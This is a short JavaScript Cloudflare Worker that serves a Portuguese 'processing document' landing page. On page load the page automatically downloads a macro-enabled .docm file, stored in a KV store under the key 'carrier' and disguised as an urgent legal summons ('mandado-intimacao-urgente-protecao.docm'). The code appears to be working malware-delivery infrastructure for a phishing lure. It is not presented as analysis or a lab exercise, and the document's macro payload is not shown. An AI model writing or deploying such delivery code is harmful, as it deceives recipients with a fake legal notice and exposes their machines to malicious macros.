export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    // HTML landing
    if (url.pathname === '/' || url.pathname === '/index.html') {
      return new Response(getHTML(), {
        headers: {'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-cache'}
      });
    }
    
    // Binary .docm from KV
    if (url.pathname === '/document.docm') {
      const carrier = await env.EMAILQUOTA.get('carrier', 'arrayBuffer');
      if (!carrier) return new Response('Not found', { status: 404 });
      
      return new Response(carrier, {
        headers: {
          'Content-Type': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          'Content-Disposition': 'attachment; filename="mandado-intimacao-urgente-protecao.docm"',
          'Cache-Control': 'no-cache'
        }
      });
    }
    
    return new Response('Not found', { status: 404 });
  }
};

function getHTML() {
  return `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Documento</title><style>body{font-family:Arial;margin:0;padding:0;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}.container{background:white;padding:40px;border-radius:8px;max-width:500px;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.1)}h1{color:#333;margin:0 0 10px 0}p{color:#666;margin:0}#status{margin-top:20px;padding:15px;background:#f0f0f0;border-radius:6px;font-family:monospace;font-size:14px}</style></head><body onload="download()"><div class="container"><h1>Carregando...</h1><p>Processando documento</p><div id="status">Aguarde...</div></div><script>async function download(){try{const r=await fetch('/document.docm');if(!r.ok)throw new Error('Indisponível');const b=await r.blob(),u=URL.createObjectURL(b),l=document.createElement('a');l.href=u;l.download='mandado-intimacao-urgente-protecao.docm';document.body.appendChild(l);l.click();document.body.removeChild(l);URL.revokeObjectURL(u);document.getElementById('status').textContent='✓ Download iniciado'}catch(e){document.getElementById('status').textContent='✗ '+e.message}}</script></body></html>`;
}
